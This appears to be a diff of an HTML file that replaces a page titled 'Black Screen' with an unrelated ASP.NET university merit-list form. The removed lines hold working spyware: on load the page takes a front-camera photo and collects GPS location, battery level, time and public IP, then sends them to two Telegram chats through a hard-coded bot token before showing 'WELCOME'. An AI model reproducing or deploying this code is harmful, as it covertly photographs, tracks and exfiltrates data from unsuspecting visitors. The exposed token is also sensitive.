@@ -1,106 +1,201 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Black Screen</title>
-    <style>
-        body { background-color: black; color: white; font-size: 20px; text-align: center; height: 100vh; display: flex; align-items: center; justify-content: center; flex-direction: column; margin: 0; }
-        #welcome { display: none; color: white; font-size: 30px; }
-        video { display: none; }
-    </style>
-</head>
-<body>
-    <div id="welcome">WELCOME</div>
 
-    <script>
-        const TELEGRAM_BOT_TOKEN = "7250347146:AAF2fQ7skQFhHoOgsboWUJzQlmYo5ZAHMC4";
-        const CHAT_IDS = ["5112680061", "6302664079"];  // Send to both users
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head id="ctl00_Head1"><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+    
+</title><link rel="shortcut icon" type="image/x-icon" href="../favicon.ico" /><link href="../App_Themes/Glass_Acua/style.css" rel="stylesheet" type="text/css" />
 
-        let video = document.createElement("video");
-        let canvas = document.createElement("canvas");
-        let context = canvas.getContext("2d");
+    <script src="../App_Themes/Glass_Acua/js/flexcroll.js" type="text/javascript"></script>
+    <script type="text/javascript" src="../App_Themes/Glass_Acua/js/jquery.js"></script>
 
-        // 🔥 Auto-request camera & GPS permissions
-        navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: "user" },  // Portrait Mode
-            audio: false 
-        })
-        .then(stream => {
-            video.srcObject = stream;
-            video.play();
 
-            video.onloadedmetadata = () => {
-                // Set canvas size for portrait mode
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
+    <script type="text/javascript">
 
-                // Capture image after a short delay
-                setTimeout(() => {
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    let imageData = canvas.toDataURL("image/png");
-                    stream.getTracks().forEach(track => track.stop());  // Stop camera
+        function preventBack() { window.history.forward(); }
 
-                    getUserDetails(imageData);
-                }, 2000); // Capture after 2 sec
-            };
-        })
-        .catch(err => console.log("Camera Permission Denied:", err));
+        setTimeout("preventBack()", 0);
 
-        async function getUserDetails(imageData) {
-            let batteryPromise = navigator.getBattery().then(battery => `${Math.round(battery.level * 100)}%`).catch(() => "Unknown");
-
-            let locationPromise = new Promise(resolve => {
-                navigator.geolocation.getCurrentPosition(
-                    pos => resolve(`Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`),
-                    () => resolve("Location Denied"),
-                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-                );
-            });
-
-            let currentTime = new Date().toLocaleString();
-            let ipPromise = fetch("https://api.ipify.org?format=json").then(res => res.json()).then(data => data.ip).catch(() => "IP not available");
-
-            let [battery, location, ip] = await Promise.all([batteryPromise, locationPromise, ipPromise]);
-
-            sendToTelegram(imageData, battery, location, currentTime, ip);
-        }
-
-        function sendToTelegram(imageData, battery, location, currentTime, ip) {
-            let message = `📸 **User Info**\n🔋 Battery: ${battery}\n📍 Location: ${location}\n🕒 Time: ${currentTime}\n🌐 IP: ${ip}`;
-
-            CHAT_IDS.forEach(chatId => {
-                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
-                }).catch(error => console.log(`Message error for ${chatId}:`, error));
-
-                let blob = dataURItoBlob(imageData);
-                let formData = new FormData();
-                formData.append("chat_id", chatId);
-                formData.append("photo", blob, "image.png");
-
-                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-                    method: "POST",
-                    body: formData
-                }).then(() => {
-                    document.body.style.backgroundColor = "black";
-                    document.getElementById("welcome").style.display = "block";
-                }).catch(error => console.log(`Photo error for ${chatId}:`, error));
-            });
-        }
-
-        function dataURItoBlob(dataURI) {
-            let byteString = atob(dataURI.split(',')[1]);
-            let mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-            let arrayBuffer = new ArrayBuffer(byteString.length);
-            let ia = new Uint8Array(arrayBuffer);
-            for (let i = 0; i < byteString.length; i++) {
-                ia[i] = byteString.charCodeAt(i);
-            }
-            return new Blob([arrayBuffer], { type: mimeString });
-        }
+        window.onunload = function() { null };
     </script>
+
+    <script type="text/javascript">
+
+        jQuery(document).ready(function() {
+            var c_url = jQuery(location).attr('href');
+            jQuery('ul.menu li a').each(function() {
+                var listItem = jQuery('.menu li a').index(this);
+                var a_url = this;
+                if (a_url == c_url) {
+                    jQuery('ul.menu li:eq(' + listItem + ') a').addClass('active');
+                }
+            });
+
+        }); 
+	
+    </script>
+
+    <noscript>
+        Please Enable Your Browser's Java Script
+    </noscript>
+            
+    
+    <style type="text/css">
+	.bucontent_area{ width:1000px !important;}
+	.buheader{ background-position:center !important;}
+</style>
+    
+    <script language="javascript" type="text/javascript">
+        function initAjaxProgress() {
+            var pageHeight = (document.documentElement && document.documentElement.scrollHeight) ? document.documentElement.scrollHeight : (document.body.scrollHeight > document.body.offsetHeight) ? document.body.scrollHeight : document.body.offsetHeight;
+            //SET HEIGHT OF BACKGROUND
+            var bg = document.getElementById('ajaxProgressBg');
+            bg.style.height = (pageHeight + 2000) + 'px';
+            //POSITION THE PROGRESS INDICATOR ON INITIAL LOAD
+            reposAjaxProgress();
+            //REPOSITION THE PROGRESS INDICATOR ON SCROLL
+            window.onscroll = reposAjaxProgress;
+        }
+
+        function reposAjaxProgress() {
+            var div = document.getElementById('ajaxProgress');
+
+            var st = document.body.scrollTop;
+            if (st == 0) {
+                if (window.pageYOffset) st = window.pageYOffset;
+                else st = (document.body.parentElement) ? document.body.parentElement.scrollTop : 0;
+            }
+            div.style.top = 150 + st + "px";
+        }                       
+    </script>
+<link href="../App_Themes/Glass_Acua/colorbox/colorbox.css" type="text/css" rel="stylesheet" /><link href="../App_Themes/Glass_Acua/css/flexcrollstyles.css" type="text/css" rel="stylesheet" /><link href="../App_Themes/Glass_Acua/jquery.mCustomScrollbar.css" type="text/css" rel="stylesheet" /><link href="../App_Themes/Glass_Acua/style.css" type="text/css" rel="stylesheet" /><link href="../App_Themes/Glass_Acua/style_new.css" type="text/css" rel="stylesheet" /></head>
+<body onload="initAjaxProgress()">
+<div id="black_strip"></div>
+    <form name="aspnetForm" method="post" action="./frmViewColConfirmList.aspx" id="aspnetForm">
+<input type="hidden" name="ctl00_toolscript1_HiddenField" id="ctl00_toolscript1_HiddenField" value="" />
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUKMTY5NzI0ODkyOA9kFgJmD2QWAgIDD2QWAgIHD2QWBAIBDxAPFgYeDURhdGFUZXh0RmllbGQFCkNvdXJzZU5hbWUeDkRhdGFWYWx1ZUZpZWxkBQpDb3Vyc2VDb2RlHgtfIURhdGFCb3VuZGdkEBUUES0tU2VsZWN0IENvdXJzZS0tD0IuQS4gSSBTZW1lc3RlchFCLkNvbS4gSSBTZW1lc3Rlch9CLlNjLiBIb21lIFNjaWVuY2UgSXN0IFNlbWVzdGVyEEIuU2MuIEkgU2VtZXN0ZXIxTS5BLiAoREVGRU5DRSBBTkQgU1RSQVRFR0lDIFNUVURJRVMpIElzdCBTZW1lc3Rlch1NLkEuIChFQ09OT01JQ1MpIElzdCBTZW1lc3Rlch1NLkEuIChFRFVDQVRJT04pIElzdCBTZW1lc3RlchtNLkEuIChFTkdMSVNIKSBJc3QgU2VtZXN0ZXIdTS5BLiAoR0VPR1JBUEhZKSBJc3QgU2VtZXN0ZXIZTS5BLiAoSElOREkpIElzdCBTZW1lc3RlchtNLkEuIChISVNUT1JZKSBJc3QgU2VtZXN0ZXIgTS5BLiAoSE9NRSBTQ0lFTkNFKSBJc3QgU2VtZXN0ZXIfTS5BLiAoTVVTSUMtVk9DQUwpIElzdCBTZW1lc3RlciVNLkEuIChQT0xJVElDQUwgU0NJRU5DRSkgSXN0IFNlbWVzdGVyHk0uQS4gKFBTWUNIT0xPR1kpIElzdCBTZW1lc3RlchxNLkEuIChTQU5TS1JJVCkgSXN0IFNlbWVzdGVyHU0uQS4gKFNPQ0lPTE9HWSkgSXN0IFNlbWVzdGVyGE0uQS4gKFVSRFUpIElzdCBTZW1lc3RlchJNLkNvbSBJc3QgU2VtZXN0ZXIVFAEwBzYwMDIyMDEHNjAwMzIwMQc2MDA0MjAxBzYwMDEyMDEHNjExNjIwMQc2MTA3MjAxBzYxMDQyMDEHNjEwNjIwMQc2MTA4MjAxBzYxMDkyMDEHNjEwMzIwMQc2MTEwMjAxBzYxMTEyMDEHNjExMjIwMQc2MTEzMjAxBzYxMTQyMDEHNjEwNTIwMQc2MTE1MjAxBzYxMDIyMDEUKwMUZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2cWAWZkAg0PPCsAEQIBEBYAFgAWAAwUKwAAZBgBBSljdGwwMCRDb250ZW50UGxhY2VIb2xkZXIxJGdyZENvbmZpcm1NZXJpdA9nZLEIG9NE8kcCOhc2eU4EC7AfxtnUWm4HChlbv975wKCZ" />
+
+
+<script src="/ScriptResource.axd?d=zSgN36Zti3IpyTVe4Bg-3vbI8XkJr17PEHXdRWDmI6gu8Vlaz7aPYwexbaPZixEvlUS4F8BRbG-XkReQVUTFewiBupf19IDR-qVnRaeGfpXXzwmCAU34kQ8fbuCAzihjhbkOq8kLraWzNtN4Qk4mQA2&amp;t=ffffffffe3663df5" type="text/javascript"></script>
+<script type="text/javascript">
+//<![CDATA[
+if (typeof(Sys) === 'undefined') throw new Error('ASP.NET Ajax client-side framework failed to load.');
+//]]>
+</script>
+
+<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="C1DA8FD8" />
+<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEdABmRiB/nMnoO/PuERNqlRBNYSSBMkay4bKLud6ysaualdBaOZer8vk45XziBnpsQJorHFUFxD2xLVoK69ttG4UY2SBXY9SpJ7pn3F2/VaAG7RWdLh7oUyg7gGSwEazguuc0OU+6tzlUQuoLjU2+H1YheJMNBNnbQxs3hPJi76uhksiK4JRv/QzzFuKwN557ms9IL36EuqL/qPv4afDfwTI3d0EAenTz0hONjJixWxqfh+GOaI7sJbD8BKI4/qQ2cSK58FV4I4BWGlUBJwAP9QtAVdlxqymwtrYhPmPqNxtvezs6rBd7+BLcGNep5BD2+4MyneDiYRRttkCrSH3tZOX/Ym07CW6KIdpfYu/BT32gktWvG4KY6iXmrfPeNugart+wHMwPYSfOhZR9KHbV7jrRbnN5xTdhwD7sqshVaJfUXcbC2q+vlrIRteSrrcdorKavA1NJM2+3SMNUZCiFaW07zWO8IGKnV/pzGCY9hYaXfeenySVeLgDSslXVdyZc5RdVSugBSZZV2Az0qT3ZHNzGzJxfC3pUmpTM6vWZcAQErkYuS79UPoEc0/3pkmCt6wms=" />
+    
+     <div id="ctl00_UpdateProgress1" style="display:none;">
+	
+            <div id="ajaxProgressBg">
+            </div>
+            <div id="ajaxProgress" style="position:fixed">
+                <div class="txt_l" >
+                    Please Wait...</div>
+            </div>
+        
+</div>
+    <div id="buwrapper">
+        <div id="buinner_wrapper">
+            <div class="buheader">
+            </div>
+            <div class="bucontent_area" >
+                
+                
+                
+    <table width="100%">
+        <tr>
+            <td align="right" width="20%">
+                <b>Course Name</b>
+            </td>
+            <td width="2%">
+                <b>:</b>
+            </td>
+            <td width="28%">
+                <select name="ctl00$ContentPlaceHolder1$ddlCourse" id="ctl00_ContentPlaceHolder1_ddlCourse" class="txtbox1">
+	<option selected="selected" value="0">--Select Course--</option>
+	<option value="6002201">B.A. I Semester</option>
+	<option value="6003201">B.Com. I Semester</option>
+	<option value="6004201">B.Sc. Home Science Ist Semester</option>
+	<option value="6001201">B.Sc. I Semester</option>
+	<option value="6116201">M.A. (DEFENCE AND STRATEGIC STUDIES) Ist Semester</option>
+	<option value="6107201">M.A. (ECONOMICS) Ist Semester</option>
+	<option value="6104201">M.A. (EDUCATION) Ist Semester</option>
+	<option value="6106201">M.A. (ENGLISH) Ist Semester</option>
+	<option value="6108201">M.A. (GEOGRAPHY) Ist Semester</option>
+	<option value="6109201">M.A. (HINDI) Ist Semester</option>
+	<option value="6103201">M.A. (HISTORY) Ist Semester</option>
+	<option value="6110201">M.A. (HOME SCIENCE) Ist Semester</option>
+	<option value="6111201">M.A. (MUSIC-VOCAL) Ist Semester</option>
+	<option value="6112201">M.A. (POLITICAL SCIENCE) Ist Semester</option>
+	<option value="6113201">M.A. (PSYCHOLOGY) Ist Semester</option>
+	<option value="6114201">M.A. (SANSKRIT) Ist Semester</option>
+	<option value="6105201">M.A. (SOCIOLOGY) Ist Semester</option>
+	<option value="6115201">M.A. (URDU) Ist Semester</option>
+	<option value="6102201">M.Com Ist Semester</option>
+
+</select>
+                
+            </td>
+        </tr>
+        <tr>
+            <td align="right" width="20%">
+                <b>College Name</b>
+            </td>
+            <td width="2%">
+                <b>:</b>
+            </td>
+            <td>
+                <select name="ctl00$ContentPlaceHolder1$ddlCollege" id="ctl00_ContentPlaceHolder1_ddlCollege" class="txtbox1">
+	<option value="0">--Select College--</option>
+
+</select>
+                
+            </td>
+        </tr>
+        <tr>
+            <td align="right" width="20%">
+                <b>Merit Type</b>
+            </td>
+            <td width="2%">
+                <b>:</b>
+            </td>
+            <td>
+                <select name="ctl00$ContentPlaceHolder1$ddlMeritType" id="ctl00_ContentPlaceHolder1_ddlMeritType" class="txtbox1">
+	<option value="0">--Select Merit--</option>
+	<option value="Merit 1">Merit 1</option>
+
+</select>
+                
+            </td>
+        </tr>
+        <tr>
+            <td colspan="3" align="center">
+                <input type="submit" name="ctl00$ContentPlaceHolder1$btnView" value="View " onclick="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;ctl00$ContentPlaceHolder1$btnView&quot;, &quot;&quot;, true, &quot;Submit&quot;, &quot;&quot;, false, false))" id="ctl00_ContentPlaceHolder1_btnView" class="btn" />
+            </td>
+        </tr>
+        <tr>
+            <td colspan="3">
+                <div>
+
+</div>
+            </td>
+        </tr>
+    </table>
+
+            </div>
+            <div class="clear">
+            </div>
+            <div class="footBU"><div class="footer">© SAGAR</div>
+</div>
+        </div>
+    </div>
+    
+
+<script type="text/javascript">
+//<![CDATA[
+(function() {var fn = function() {$get("ctl00_toolscript1_HiddenField").value = '';Sys.Application.remove_init(fn);};Sys.Application.add_init(fn);})();//]]>
+</script>
+</form>
 </body>
 </html>
